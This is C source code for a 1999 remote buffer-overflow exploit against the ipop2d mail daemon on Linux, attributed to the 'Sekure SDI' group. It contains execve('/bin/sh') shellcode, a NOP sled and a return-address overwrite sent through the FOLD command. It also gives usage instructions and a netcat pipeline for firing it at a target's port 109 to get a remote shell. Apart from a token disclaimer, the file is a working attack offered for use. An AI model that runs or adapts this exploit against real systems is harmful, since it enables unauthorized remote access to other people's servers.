/*
 * Sekure SDI (Brazilian Information Security Team)
 * ipop2d remote exploit for linux (Jun, 02 1999)
 *
 * by c0nd0r <condor@sekure.org>
 *
 *  (read the instructions below)
 *
 *  Thanks to jamez, bahamas, dumped, bishop, slide, paranoia, stderr,
 *            falcon, vader, c_orb, marty(nordo!) and minha malinha!
 *            also to #uground (irc.brasnet.org) and #SDI (efnet),
 *            guys at el8.org, toxyn.org, pulhas.org
 *
 *  Sincere Apologizes: duke (for the mistake we made with the wu-expl),
 *                     your code rocks.
 *
 *  Usage:
 *
 *    SDI-pop2 <imap_server> <user> <pass> [offset]
 *
 *   where  imap_server = IMAP server at your box (or other place as well)
 *          user = any account at your box
 *          pass = the account's password
 *          offset = 0 is default -- increase if it's necessary.
 *
 *  Example: (netcat rocks)
 *
 *  (./SDI-pop ppp-666.lame.org rewt lame 0; cat) | nc lame.org 109
 *
 *  ----------------------------------------------------------------
 *  HOWTO-exploit:
 *
 *   In order to gain remote access as user nobody, you should set
 *   an IMAP server at your box (just edit the inetd.conf) or at
 *   any other machine which you have an account.
 *
 *   During the anonymous_login() function, the ipop2d will set the
 *   uid to user nobody, so you are not going to get a rootshell.
 *  ----------------------------------------------------------------
 *
 *  We do NOT take any responsability for the consequences of using
 *  this code -- you've been warned! don't be a script k1dd13!
 *
 */


#include <stdio.h>

/*
 *  (shellcode)
 * 
 *       jmp   0x1f
 *       popl  %esi
 *       movl  %esi,0x8(%esi)
 *       xorl  %eax,%eax
 *       movb  %eax,0x7(%esi)
 *       movl  %eax,0xc(%esi)
 *       movb  $0xb,%al
 *       movl  %esi,%ebx
 *       leal  0x8(%esi),%ecx
 *       leal  0xc(%esi),%edx
 *       int   $0x80
 *       xorl  %ebx,%ebx
 *       movl  %ebx,%eax
 *       inc   %eax
 *       int   $0x80
 *       call  -0x24
 *       .string \"/bin/sh\"
 * grab your shellcode generator at www.sekure.org
 */

char c0d3[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89"
        "\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
        "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff"
        "\xff\xff/bin/sh";
 

main (int argc, char *argv[] ) {
 char buf[2500];
 int x,y=1000, offset=0;
 long addr;
 char host[255], user[255], pass[255];
 int bsize=986;
 
 if ( argc < 4) {
  printf ( "Sekure SDI ipop2d remote exploit - Jun, 02 1999\n");
  printf ( "usage:
(SDI-pop2 <imap server> <user> <pass> [offset];cat) | nc lame.org 109\n");
  exit (0);
 }
  
 snprintf ( host, sizeof(host), "%s", argv[1]);
 snprintf ( user, sizeof(user), "%s", argv[2]);
 snprintf ( pass, sizeof(pass), "%s", argv[3]);
 
 if ( argc > 4) offset = atoi ( argv[4]);
 /* gimme the ret + offset */
 addr = 0xbffff3c0 + offset; 
 fprintf ( stderr, "0wning data since 0x%x\n\n", addr);
 
 /* calculation of the return address position */
 bsize -= strlen ( host);
 
 for ( x = 0; x < bsize-strlen(c0d3); x++)
  buf[x] = 0x90;
 
 for ( y = 0; y < strlen(c0d3); x++, y++)
  buf[x] = c0d3[y]; 
 
 for (  ; x < 1012; x+=4) { 
  buf[x  ] = addr & 0x000000ff;
  buf[x+1] = (addr & 0x0000ff00) >> 8;
  buf[x+2] = (addr & 0x00ff0000) >> 16;
  buf[x+3] = (addr & 0xff000000) >> 24;
 }
        
 sleep (1);
 printf ( "HELO %s:%s %s\r\n", host, user, pass);
 sleep (1);
 printf ( "FOLD %s\r\n", buf);

}

